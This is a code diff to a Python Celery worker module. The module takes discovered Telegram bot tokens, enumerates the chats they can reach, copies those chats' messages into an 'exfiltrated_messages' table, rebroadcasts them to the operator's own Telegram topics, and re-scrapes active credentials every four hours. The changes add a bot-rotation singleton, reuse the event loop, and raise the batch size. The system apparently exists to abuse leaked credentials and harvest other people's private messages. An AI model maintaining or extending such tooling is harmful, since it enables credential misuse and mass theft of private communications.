@@ -4,7 +4,6 @@ from app.workers.celery_app import app
 from app.core.database import db
 from app.core.security import security
 from app.services.scraper_srv import scraper_service
-# from app.services.broadcaster_srv import broadcaster_service # Local imports only
 import redis
 from app.core.config import settings
 import logging
@@ -21,6 +20,27 @@ async def async_execute(query_builder):
 # Redis Client for Locking
 redis_client = redis.from_url(settings.REDIS_URL, decode_responses=True)
 
+
+# ==============================================
+# BROADCASTER SINGLETON (BUG-011)
+# Module-level instance so bot rotation state (itertools.cycle)
+# persists across task invocations within the same worker process.
+# ==============================================
+_broadcaster = None
+
+
+def get_broadcaster():
+    """
+    Returns the module-level BroadcasterService singleton.
+    Lazy-initialized to avoid import-time issues.
+    Bot rotation state is preserved across all task calls in this worker.
+    """
+    global _broadcaster
+    if _broadcaster is None:
+        from app.services.broadcaster_srv import BroadcasterService
+        _broadcaster = BroadcasterService()
+    return _broadcaster
+
 @app.task(name="flow.exfiltrate_chat", soft_time_limit=2400, time_limit=2500)
 def exfiltrate_chat(cred_id: str):
     """
@@ -30,25 +50,27 @@ def exfiltrate_chat(cred_id: str):
     4. Trigger broadcast.
     """
     try:
-        return asyncio.run(_exfiltrate_logic(cred_id))
+        from app.workers.celery_app import get_worker_loop
+        return get_worker_loop().run_until_complete(_exfiltrate_logic(cred_id))
     except SoftTimeLimitExceeded:
         logger.warning(f"⏰ [Exfil] Soft time limit exceeded for {cred_id}. Saving partial results.")
         return f"Exfiltration timed out for {cred_id} (partial results may have been saved)."
 
 async def _exfiltrate_logic(cred_id: str):
     logger.info(f"🕵️ [Exfil] Starting process for CredID: {cred_id}")
-    
-    # Local instantiation for logging
-    from app.services.broadcaster_srv import BroadcasterService
-    broadcaster = BroadcasterService()
+
+    broadcaster = get_broadcaster()
     await broadcaster.send_log(f"🕵️ Starting exfiltration for CredID: `{cred_id}`")
 
     # T010: Observability hook
     from app.core.metrics import metrics
     from app.core.audit import AuditLogger
     metrics.inc("exfiltrate.started")
-    audit_log = AuditLogger()
-    audit_log.log_event("exfiltrate.start", {"cred_id": cred_id})
+    AuditLogger.log(
+        event_type="exfiltrate.start",
+        credential_id=cred_id,
+        details={"cred_id": cred_id}
+    )
     
     # Fetch credential
     response = await async_execute(db.table("discovered_credentials").select("bot_token, chat_id").eq("id", cred_id))
@@ -148,7 +170,8 @@ def enrich_credential(cred_id: str):
     3. Update DB with Chat ID(s).
     4. Trigger Exfiltration.
     """
-    return asyncio.run(_enrich_logic(cred_id))
+    from app.workers.celery_app import get_worker_loop
+    return get_worker_loop().run_until_complete(_enrich_logic(cred_id))
 
 async def _enrich_logic(cred_id: str):
     logger.info(f"✨ [Enrich] Starting enrichment for credential {cred_id}")
@@ -157,11 +180,13 @@ async def _enrich_logic(cred_id: str):
     from app.core.metrics import metrics
     from app.core.audit import AuditLogger
     metrics.inc("enrich.started")
-    audit_log = AuditLogger()
+    AuditLogger.log(
+        event_type="enrich.start",
+        credential_id=cred_id,
+        details={"cred_id": cred_id}
+    )
 
-    # Local instantiation for logging
-    from app.services.broadcaster_srv import BroadcasterService
-    broadcaster = BroadcasterService()
+    broadcaster = get_broadcaster()
     await broadcaster.send_log(f"✨ Starting enrichment for CredID: `{cred_id}`")
     # Fetch credential
     response = await async_execute(db.table("discovered_credentials").select("bot_token").eq("id", cred_id))
@@ -275,14 +300,17 @@ async def _enrich_logic(cred_id: str):
             pass
             
         if len(chats) > 1:
-            # Update meta with list of other chats
+            # Update meta with list of other chats — preserve topic_id and bot info (BUG-004)
             all_chat_ids = [c["id"] for c in chats]
             await async_execute(db.table("discovered_credentials").update({
                 "meta": {
-                    "chat_name": first_chat["name"], 
-                    "type": first_chat["type"], 
+                    "chat_name": first_chat["name"],
+                    "type": first_chat["type"],
                     "enriched": True,
-                    "all_chats": all_chat_ids
+                    "all_chats": all_chat_ids,
+                    "topic_id": topic_id,        # Preserve topic_id set above
+                    "bot_username": bot_username, # Preserve bot info
+                    "bot_id": bot_id,
                 }
             }).eq("id", cred_id))
             msg += f" (Found {len(chats)} total chats, tracking primary only)"
@@ -306,42 +334,35 @@ def broadcast_pending():
         return "System Paused"
 
     try:
-        return asyncio.run(_broadcast_logic())
+        from app.workers.celery_app import get_worker_loop
+        return get_worker_loop().run_until_complete(_broadcast_logic())
     finally:
         try:
             lock.release()
         except redis.exceptions.LockError:
-            pass # Lock expired or already released
+            pass  # Lock expired or already released
 
 async def _broadcast_logic():
     """
     Broadcast pending messages to Telegram topics.
-    Uses DB-level atomic claims to prevent duplicates across ALL environments
-    (Railway, local Docker, local scripts) since they all share the same Supabase DB.
+    Uses DB-level atomic claims to prevent duplicates across ALL environments.
     """
-
     from datetime import datetime, timezone, timedelta
-    from app.core.config import settings
-    # Instantiate locally to avoid Event Loop errors
-    from app.services.broadcaster_srv import BroadcasterService
-    broadcaster = BroadcasterService()
-    
+
+    broadcaster = get_broadcaster()
+
     # Claim timeout - if a claim is older than this, consider it stale (worker crashed)
     CLAIM_TIMEOUT_MINUTES = 5
     stale_threshold = datetime.now(timezone.utc) - timedelta(minutes=CLAIM_TIMEOUT_MINUTES)
-    
-    # Query pending messages that are:
-    # 1. Not broadcasted, AND
-    # 2. Either unclaimed (broadcast_claimed_at IS NULL) OR claim is stale (> 5 min old)
-    # 
-    # NOTE: Supabase doesn't support complex OR conditions easily via Python client.
-    # So we'll fetch unclaimed messages and check claim freshness in Python.
-    response = await async_execute(db.table("exfiltrated_messages")\
-        .select("*, discovered_credentials!inner(meta)")\
-        .eq("is_broadcasted", False)\
-        .order("telegram_msg_id", desc=False)\
-        .limit(20)\
-        )
+
+    # BUG-009: Increased from 20 to 100 to reduce queue backlog
+    response = await async_execute(
+        db.table("exfiltrated_messages")
+        .select("*, discovered_credentials!inner(meta)")
+        .eq("is_broadcasted", False)
+        .order("telegram_msg_id", desc=False)
+        .limit(100)
+    )
     
     messages = response.data
     if not messages:
@@ -505,8 +526,8 @@ async def _broadcast_logic():
                 await async_execute(db.table("exfiltrated_messages").update({
                     "broadcast_claimed_at": None
                 }).eq("id", msg_id))
-            except:
-                pass  # Best effort cleanup
+            except Exception:
+                pass  # Best effort cleanup — do not raise during error handling
             continue
     
     result = f"Broadcasted {sent_count}/{len(messages)} messages"
@@ -518,27 +539,22 @@ async def _broadcast_logic():
 
 @app.task(name="flow.system_heartbeat")
 def system_heartbeat():
-    """
-    Periodic ping to confirm system uptime.
-    """
+    """Periodic ping to confirm system uptime."""
     msg = "💓 **System Heartbeat**: Worker is active and scanning."
-    
-    # Update Redis Timestamp for Watchdog
+
     try:
         redis_client.set("system:heartbeat:last_seen", int(time.time()))
     except Exception as e:
         logger.warning(f"Failed to update heartbeat in Redis: {e}")
 
-    from app.services.broadcaster_srv import BroadcasterService
-    broadcaster = BroadcasterService()
-    asyncio.run(broadcaster.send_log(msg))
+    from app.workers.celery_app import get_worker_loop
+    get_worker_loop().run_until_complete(get_broadcaster().send_log(msg))
     return "Heartbeat sent."
+
 
 @app.task(name="flow.system_help")
 def system_help():
-    """
-    Periodic guide on how to use system commands.
-    """
+    """Periodic guide on how to use system commands."""
     msg = (
         "ℹ️ **System Commands Guide**\n"
         "You can control the system using these commands:\n\n"
@@ -548,10 +564,10 @@ def system_help():
         "• `/restart` - Restart the Bot Listener process.\n\n"
         "_Commands are restricted to Admins and Whitelisted Users._"
     )
-    from app.services.broadcaster_srv import BroadcasterService
-    broadcaster = BroadcasterService()
-    asyncio.run(broadcaster.send_log(msg))
+    from app.workers.celery_app import get_worker_loop
+    get_worker_loop().run_until_complete(get_broadcaster().send_log(msg))
     return "Help guide sent."
+
 
 @app.task(name="flow.rescrape_active")
 def rescrape_active():
@@ -559,18 +575,16 @@ def rescrape_active():
     Periodic task to re-scrape all active credentials for new messages.
     Runs every 4 hours to catch new activity in monitored chats.
     """
-    return asyncio.run(_rescrape_active_logic())
+    from app.workers.celery_app import get_worker_loop
+    return get_worker_loop().run_until_complete(_rescrape_active_logic())
+
 
 async def _rescrape_active_logic():
-    """
-    Query all active credentials with a chat_id and trigger exfiltration.
-    """
-    # T010: Observability hook
+    """Query all active credentials with a chat_id and trigger exfiltration."""
     from app.core.metrics import metrics
     metrics.inc("rescrape.started")
 
-    from app.services.broadcaster_srv import BroadcasterService
-    broadcaster = BroadcasterService()
+    broadcaster = get_broadcaster()
     await broadcaster.send_log("🔄 **Re-scrape**: Starting periodic scrape of active credentials...")
     
     try:
